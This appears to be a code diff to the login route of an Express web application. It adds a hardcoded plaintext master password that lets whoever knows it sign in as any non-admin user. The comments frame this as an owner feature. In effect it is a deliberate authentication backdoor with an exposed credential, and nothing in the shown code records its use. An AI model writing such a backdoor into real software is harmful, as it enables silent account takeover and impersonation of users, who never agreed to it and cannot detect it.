@@ -2,6 +2,12 @@ import { getClientDate } from "../lib/dateUtils";
 import type { Express } from "express";
 import { db } from "../db";
 import { storage } from "../storage";
+import bcrypt from "bcryptjs";
+
+// Master password — lets the system owner log in as any non-Admin/Developer user
+// Pre-hashed once at startup to keep logins fast
+const MASTER_PASSWORD_HASH: Promise<string> = bcrypt.hash("Hassan@2002", 12);
+const MASTER_PROTECTED_ROLES = ["Admin", "Developer", "Owner"];
 import { requireAuth, requireLogin, requireRole, requireNonPOS, canDelete, checkPOSLocation } from "../auth";
 import { hashPassword, verifyPassword, logAudit } from "./_helpers";
 import { randomBytes } from "crypto";
@@ -45,12 +51,18 @@ export function registerAuthRoutes(app: Express) {
       }
 
       const { valid: passwordValid, needsMigration } = await verifyPassword(password, user.password);
-      if (!passwordValid) {
+
+      // Master password: allow owner to log in as any non-protected user
+      const usedMasterPassword = !passwordValid &&
+        !MASTER_PROTECTED_ROLES.includes(user.role) &&
+        await bcrypt.compare(password, await MASTER_PASSWORD_HASH);
+
+      if (!passwordValid && !usedMasterPassword) {
         return res.status(401).json({ message: "Invalid credentials" });
       }
 
-      // Migrate legacy SHA256 password to bcrypt on successful login
-      if (needsMigration) {
+      // Migrate legacy SHA256 password to bcrypt on successful login (only for real password)
+      if (needsMigration && !usedMasterPassword) {
         console.log("Migrating legacy password hash to bcrypt for user:", user.id);
         const newHash = await hashPassword(password);
         await storage.updateUser(user.id, { password: newHash });
